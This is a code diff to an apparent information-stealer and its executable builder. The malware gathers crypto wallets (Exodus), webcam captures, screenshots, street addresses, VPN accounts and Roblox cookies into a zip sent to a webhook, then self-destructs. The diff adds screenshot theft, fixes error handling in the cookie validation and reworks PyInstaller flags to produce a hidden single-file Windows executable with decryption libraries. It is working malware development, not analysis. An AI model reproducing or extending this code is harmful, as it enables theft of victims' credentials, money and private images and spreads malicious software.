@@ -2627,13 +2627,16 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                     zf.writestr("Crypto/Exodus/exodus.wallet.zip", exf.read())
             if FEAT_WEBCAM:
                 cam_img = capture_webcam_image()
-                if cam_img and os.path.exists(cam_img):
-                    with open(cam_img, 'rb') as f:
-                        zf.writestr("Webcam/webcam_capture.jpg", f.read())
-                    try: os.remove(cam_img)
-                    except: pass
+                if cam_img:
+                    cam_img.seek(0)
+                    zf.writestr("Webcam/webcam_capture.png", cam_img.read())
             if FEAT_GRAB_ADDRESS and street_address:
                 zf.writestr("System/street_address.txt", street_address)
+            if FEAT_SCREENSHOT:
+                ss = take_screenshot()
+                if ss:
+                    ss.seek(0)
+                    zf.writestr("Screenshot/screenshot.png", ss.read())
             if mullvad_accounts:
                 zf.writestr("VPN/Mullvad/mullvad_accounts.txt", "\n\n".join(mullvad_accounts))
         zip_buffer.seek(0)
@@ -2822,8 +2825,8 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                         if avatar_img_url:
                             embed["thumbnail"] = {"url": avatar_img_url}
                 except Exception as _e:
-                    code = getattr(_e, 'code', None)
-                    if e.code == 401:
+                    err_code = getattr(_e, 'code', None) if hasattr(_e, 'code') else None
+                    if err_code == 401:
                         embed["fields"].append({
                             "name": "**Roblox Account**",
                             "value": f"```yaml\nCookie found but INVALID (401)\nCookie length: {len(first_cookie)} chars\n```",
@@ -2832,7 +2835,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                     else:
                         embed["fields"].append({
                             "name": "**Roblox Account**",
-                            "value": f"```yaml\nError validating cookie: HTTP {e.code}\n```",
+                            "value": f"```yaml\nError validating cookie: HTTP {err_code if err_code else 'Unknown'}\n```",
                             "inline": False
                         })
                 except Exception as e:
@@ -3108,12 +3111,8 @@ __PH_SHOW_ERROR__
     if exodus_wallet_zip and os.path.exists(exodus_wallet_zip):
         try: os.remove(exodus_wallet_zip)
         except: pass
-    ss = take_screenshot()
-    if ss and os.path.exists(ss):
-        try: os.remove(ss)
-        except: pass
+    time.sleep(5)
     self_destruct()
-
 if __name__ == "__main__":
     try:
         main()
@@ -3866,29 +3865,32 @@ class SleekBuilder:
             os.makedirs(spec_dir, exist_ok=True)
 
             cmd = [
-                sys.executable, '-m', 'PyInstaller',
-                '--onefile',
-                '--noconsole',
-                f'--name={exe_name}',
-                f'--distpath={final_dist}',
-                f'--workpath={build_dir}',
-                f'--specpath={spec_dir}',
-                '--hidden-import=win32crypt',
-                '--hidden-import=Crypto',
-                '--hidden-import=Crypto.Cipher',
-                '--hidden-import=requests',
-                '--hidden-import=selenium',
-                '--hidden-import=selenium.webdriver',
-                '--hidden-import=selenium.webdriver.chrome.options',
-                '--hidden-import=PIL',
-                '--hidden-import=PIL.ImageGrab',
-                '--hidden-import=sqlite3',
-                '--hidden-import=zipfile',
-                '--hidden-import=io',
-                '--noconfirm',
-                temp_py
-            ]
-
+    sys.executable, '-m', 'PyInstaller',
+    '--onefile',
+    '--noconsole',
+    f'--name={exe_name}',
+    f'--distpath={final_dist}',
+    f'--workpath={build_dir}',
+    f'--specpath={spec_dir}',
+    '--collect-all=Crypto',
+    '--collect-all=pywin32',
+    '--hidden-import=Crypto.Cipher.AES',
+    '--hidden-import=Crypto.Cipher.DES3',
+    '--hidden-import=Crypto.Protocol.KDF',
+    '--hidden-import=Crypto.Hash.SHA256',
+    '--hidden-import=Crypto.Hash.HMAC',
+    '--hidden-import=Crypto.Util.Padding',
+    '--hidden-import=Crypto.Random',
+    '--hidden-import=win32crypt',
+    '--hidden-import=win32api',
+    '--hidden-import=requests',
+    '--hidden-import=PIL.ImageGrab',
+    '--hidden-import=sqlite3',
+    '--hidden-import=zipfile',
+    '--hidden-import=io',
+    '--noconfirm',
+    temp_py
+]
             icon_path = self.exe_icon_path.get().strip()
             if icon_path and os.path.exists(icon_path):
                 cmd.insert(3, f'--icon={icon_path}')
